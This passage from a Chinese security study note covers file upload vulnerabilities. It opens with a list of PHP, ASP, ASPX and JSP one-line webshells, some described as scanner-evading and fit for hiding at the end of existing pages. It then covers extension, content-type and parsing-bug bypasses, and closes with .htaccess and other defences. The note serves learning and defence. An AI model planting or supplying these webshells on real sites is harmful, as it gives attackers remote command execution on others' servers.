class="hljs-meta">&lt;?</span><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cc&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cc&#x27;</span>])<span class="hljs-meta">?&gt;</span> <br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[email]/e&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;h&#x27;</span>],<span class="hljs-string">&quot;error&quot;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/</span>:&lt;O&gt;h=@<span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST1</span>);&lt;/O&gt; <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]` <span class="hljs-meta">?&gt;</span> <br><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;@<span class="hljs-title function_ invoke__">eval_r</span>(<span class="hljs-variable">$_POST</span>[sb])&lt;/script&gt; <span class="hljs-comment">//绕过&lt;?限制的一句话</span><br><br><span class="hljs-meta">&lt;?php</span> (])<span class="hljs-meta">?&gt;</span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！<br><br><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]))&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]);&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span> <br>加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！<br><br>&lt;%execute <span class="hljs-title function_ invoke__">request</span>(“<span class="hljs-keyword">class</span>”)%&gt;&lt;%<span class="hljs-string">&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;</span>&lt;% loop &lt;%:%&gt;&lt;%execute <span class="hljs-title function_ invoke__">request</span> (“<span class="hljs-keyword">class</span>”)%&gt;&lt;%execute <span class="hljs-title function_ invoke__">request</span>(“<span class="hljs-keyword">class</span>”)<span class="hljs-string">&#x27;&lt;% loop &lt;%:%&gt; </span><br><span class="hljs-string">无防下载表，有防下载表可尝试插入以下语句突破的一句话 </span><br><span class="hljs-string">&lt;%eval(request(“1″)):response.end%&gt; 备份专用</span><br></code></pre></td></tr></table></figure><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">##JSP：<br>&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-literal">null</span>)(newjava.io.FileOutputStream (application.getRealPath(<span class="hljs-string">&quot;\\&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write (request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt; <br>提交客户端 <br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;&lt;textareaname=<span class="hljs-string">&quot;t&quot;</span>&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=<span class="hljs-string">&quot;submit&quot;</span>value=<span class="hljs-string">&quot;提交&quot;</span>&gt;&lt;/form&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asp">##ASP<br>&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;<br><br>&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; <br><br>&lt;%execute(request(“1″))%&gt; <br><br>&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#x27;&lt;,&gt;‘的asp一句话 <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs aspx">##aspx<br>&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; <br><br>&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; <br><br>&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。<br><br></code></pre></td></tr></table></figure><h1 id="文件上传漏洞的原因"><a href="#文件上传漏洞的原因" class="headerlink" title="文件上传漏洞的原因"></a>文件上传漏洞的原因</h1><ol><li>文件扩展名或者后缀名没有做好严格的限制</li><li>文件上传的表述方法没有做好检查</li><li>没有对文件设置不可执行权限（特别是shebang<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="就是符号`#!`这个一般存在于shell脚本的第一行[^NTFS ]: [FAT32、NTFS和exFAT的区别是什么？该如何选择？_exfat和ntfs的区别-CSDN博客](https://blog.csdn.net/qq_43003203/article/details/108463388#:~:text=1、FAT32格式： Windows平台的传统文件格式，Windows,95第二版首次引入，取代FAT16 (支持文件最大容量2GB)，兼容性很好，但缺点是对文件大小有限制，不支持超过4GB的文件。 所以，对于很多大型游戏、镜像文件、压缩包、视频，它是没有办法的。)">[1]</span></a></sup>）</li><li>对于web server对于上传文件或者指定目录的行为没有做限制</li></ol><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol><li><p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p></li><li><p>文件上传后导致的常见安全问题一般有:</p><ul><li><p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>码执行;</p></li><li><p>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</p></li><li><p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p></li><li><p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</p></li></ul><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。此类问题不在此细述。</p></li></ol><h1 id="文件上传漏洞的攻击和防御方法"><a href="#文件上传漏洞的攻击和防御方法" class="headerlink" title="文件上传漏洞的攻击和防御方法"></a>文件上传漏洞的攻击和防御方法</h1><h2 id="前端限制"><a href="#前端限制" class="headerlink" title="前端限制"></a>前端限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    &lt;h3&gt;代码&lt;/h3&gt;<br>&lt;pre&gt;<br>&lt;code <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">line</span>-<span class="hljs-title">numbers</span> <span class="hljs-title">language</span>-<span class="hljs-title">javascript</span>&quot;&gt;<span class="hljs-title">function</span> <span class="hljs-title">checkFile</span>() </span>&#123;<br>    <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].value;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));  <span class="hljs-comment">//substring(index) 开始截取的下标</span><br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_ invoke__">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br>&lt;/code&gt;<br>&lt;/pre&gt;<br>&lt;/li&gt;<br><br></code></pre></td></tr></table></figure><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>通过调用js在前端检查是否是允许上传的文件，并不会推送到服务器</p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>这种限制很简单，通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p><h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p>准备好一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>并且修改后缀名为jpg，上传操作，通过burpsuit抓包改包，使其后缀名修改回php。</p><p>注意这个先后关系，前端检测完了发现可以通过后会将数据发送到服务器，我们使用bs抓包，抓到的是前端检查过后的数据</p><h2 id="检查扩展名"><a href="#检查扩展名" class="headerlink" title="检查扩展名"></a>检查扩展名</h2><h3 id="黑名单策略"><a href="#黑名单策略" class="headerlink" title="黑名单策略"></a>黑名单策略</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//黑名单策略</span><br>&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    &lt;h3&gt;代码&lt;/h3&gt;<br>&lt;pre&gt;<br>&lt;code <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">line</span>-<span class="hljs-title">numbers</span> <span class="hljs-title">language</span>-<span class="hljs-title">php</span>&quot;&gt;$<span class="hljs-title">is_upload</span> = <span class="hljs-title">false</span>;</span><br><span class="hljs-class">$<span class="hljs-title">msg</span> = <span class="hljs-title">null</span>;</span><br><span class="hljs-class"><span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">submit</span>&#x27;])) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br>&lt;/code&gt;<br>&lt;/pre&gt;<br>&lt;/li&gt;<br><br></code></pre></td></tr></table></figure><h3 id="白名单策略"><a href="#白名单策略" class="headerlink" title="白名单策略"></a>白名单策略</h3><p>文件扩展名不在白名单中就是不合法的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;li id=<span class="hljs-string">&quot;show_code&quot;</span>&gt;<br>    &lt;h3&gt;代码&lt;/h3&gt;<br>&lt;pre&gt;<br>&lt;code <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">line</span>-<span class="hljs-title">numbers</span> <span class="hljs-title">language</span>-<span class="hljs-title">php</span>&quot;&gt;$<span class="hljs-title">is_upload</span> = <span class="hljs-title">false</span>;</span><br><span class="hljs-class">$<span class="hljs-title">msg</span> = <span class="hljs-title">null</span>;</span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">submit</span>&#x27;]))</span>&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br>&lt;/code&gt;<br>&lt;/pre&gt;<br>&lt;/li&gt;<br><br></code></pre></td></tr></table></figure><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p><h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在一些Web server中，存在解析漏洞:</p><ol><li>老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 &#x2F;.asp&#x2F;目录，那么此目录下面的一切内容都会被当作asp脚本来解析</li><li>老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg</li><li>旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行</li><li>nginx(0.5.x, 0.6.x, 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）</li><li>apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，<strong>rar</strong>等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</li></ol><h3 id="检查Content-Type"><a href="#检查Content-Type" class="headerlink" title="检查Content-Type"></a>检查Content-Type</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型，不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p><h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>可以使用bs抓包，然后更改文件格式，也就是header</p><h3 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h3><p>给上传脚本加上相应的幻数头字节就可以，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行比如下面：<br>（一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符。）</p><h3 id="限制web-server"><a href="#限制web-server" class="headerlink" title="限制web server"></a>限制web server</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>导致文件上传漏洞的根本原因在于服务把用户上传的本应是数据的内容当作了代码，一般而言：用户上传的内容都会被存储到特定的一个文件夹下，比如我们很多人习惯于放在 .&#x2F;upload&#x2F; 下面要防止数据被当作代码执行，我们可以限制web server对于特定文件夹的行为。</p><blockquote><p>在默认情况下，对与 .php文件Apache会当作代码来执行，对于 html,css,js文件，则会直接由HTTP Response交给客户端程序对于一些资源文件，比如txt，doc，rar等等，则也会以文件下载的方式传送的客户端。我们希望用户上传的东西仅仅当作资源和数据而不能当作代码。因此Apache使用服务器程序的接口来进行限制利用 .htaccess 文件机制来对web server行为进行限制。</p></blockquote><h4 id="几种处理方式"><a href="#几种处理方式" class="headerlink" title="几种处理方式"></a>几种处理方式</h4><h5 id="指定特定扩展名的文件的处理方式"><a href="#指定特定扩展名的文件的处理方式" class="headerlink" title="指定特定扩展名的文件的处理方式"></a>指定特定扩展名的文件的处理方式</h5><p><strong>原理：</strong></p><p>原理是指定Response的Content-Type可以加上如下几行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">AddType text/plain .pl .py .php<br></code></pre></td></tr></table></figure><p>这种情况下会将指定的文件转变为文本文件</p><h5 id="完全禁止特定扩展名的文件被访问"><a href="#完全禁止特定扩展名的文件被访问" class="headerlink" title="完全禁止特定扩展名的文件被访问"></a>完全禁止特定扩展名的文件被访问</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">Options -ExecCGI<br>AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别<br></code></pre></td></tr></table></figure><p>注意上面的减号用于禁用cgi</p><h5 id="强制web服务器对于特定文件类型的处理"><a href="#强制web服务器对于特定文件类型的处理" class="headerlink" title="强制web服务器对于特定文件类型的处理"></a>强制web服务器对于特定文件类型的处理</h5><p>这个方法是将特定文件按照我们指定的方式处理</p><blockquote><p><strong>与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型</strong></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt;<br>ForceType text/plain<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><h5 id="只允许访问特定的文件类型（白名单）"><a href="#只允许访问特定的文件类型（白名单）" class="headerlink" title="只允许访问特定的文件类型（白名单）"></a>只允许访问特定的文件类型（白名单）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt;<br>order deny,allow<br>deny from all<br>&lt;/Files&gt;<br><br></code></pre></td></tr></table></figure><h4 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h4><p><strong>可以通过 move_uploaded_file 函数把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限。</strong></p><h4 id="什么是htaccess"><a href="#什么是htaccess" class="headerlink" title="什么是htaccess"></a>什么是htaccess</h4><ul><li>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</li><li>.htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。 .htaccess的用途范围主要针对当前目录。</li></ul><p><a href="https://www.cnblogs.com/engeng/articles/5948089.html">apache .htaccess文件详解和配置技巧总结 - 恩恩先生 - 博客园 (cnblogs.com)</a></p><h3 id="文件系统00截断"><a href="#文件系统00截断" class="headerlink" title="文件系统00截断"></a>文件系统00截断</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。**利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00、%00上传截断漏洞。</p><h4 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的</p><h3 id="windows-NTFS文件系统特性绕过"><a href="#windows-NTFS文件系统特性绕过" class="headerlink" title="windows NTFS文件系统特性绕过"></a>windows NTFS文件系统特性绕过</h3><p>NTFS交换数据流是NTFS[^NTFS ]磁盘格式的新特性</p><p>遇到了添加</p><h3 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h3><h1 id="防御总结"><a href="#防御总结" class="headerlink" title="防御总结"></a>防御总结</h1><ol><li><p>黑名单</p></li><li><p>白名单</p></li><li><p>服务器隔离</p><p>放到一个专门放置静态资源的服务器</p></li><li><p>不回显文件路径</p></li><li><p>压缩（二次渲染）</p></li><li><p>读取文件信息</p></li><li><p>限制文件大小</p></li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol><li><p>如果都被防了，我们可以尝试上传脏文件</p><p>比如1G等大文件</p></li><li><p>查找webshell</p><ul><li>图片上传的路径</li><li>响应体中找</li><li>找别人的文件</li></ul></li></ol><h1 id="靶场刷题记录"><a href="#靶场刷题记录" class="headerlink" 